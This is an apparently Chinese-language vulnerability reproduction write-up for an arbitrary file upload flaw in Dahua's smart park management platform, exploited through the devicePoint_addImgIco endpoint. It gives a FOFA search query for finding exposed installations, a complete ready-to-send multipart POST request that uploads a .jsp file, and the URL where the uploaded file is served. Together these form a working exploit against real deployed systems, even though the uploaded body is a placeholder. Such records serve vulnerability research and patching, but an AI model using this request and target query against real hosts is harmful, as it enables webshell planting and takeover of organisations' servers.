# 大华智慧园区综合管理平台devicePoint_addImgIco任意文件上传漏洞

# 一、漏洞描述
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。 大华智慧园区综合管理平台存在文件上传漏洞，攻击者可以通过devicePoint_addImgIco接口任意上传文件，导致系统被攻击与控制。

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ FOFA：`app=”dahua-智慧园区综合管理平台”`

![1689521413401-0fcf65cb-53cc-4666-af1d-1dc09204909c.png](./img/hi1qO8cn6s8WakbW/1689521413401-0fcf65cb-53cc-4666-af1d-1dc09204909c-329370.png)

+ 登陆页面：

![1689521436792-cc9eee7b-0158-4165-98e2-cb02571c6b37.png](./img/hi1qO8cn6s8WakbW/1689521436792-cc9eee7b-0158-4165-98e2-cb02571c6b37-667321.png)

# 四、漏洞复现
构造如下数据包：

```plain
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
User-Agent: Java/1.8.0_345
Host: 127.0.0.1:8009
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 223
Connection: close

--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Content-Disposition: form-data; name="upload"; filename="1ndex.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

123
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--
```

![1689521496391-6cc01c58-3eaf-4f41-979e-cd73555e1a8c.png](./img/hi1qO8cn6s8WakbW/1689521496391-6cc01c58-3eaf-4f41-979e-cd73555e1a8c-471004.png)

上传文件访问地址：`http://127.0.0.1:8314/upload/emap/society_new/ico_res_221b04b177b8_on.jsp`

![1689521515458-6cc6cba2-23aa-48a9-935d-544867a65246.png](./img/hi1qO8cn6s8WakbW/1689521515458-6cc6cba2-23aa-48a9-935d-544867a65246-774167.png)



> 更新: 2024-02-29 23:57:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hfgy041afmv0g04c>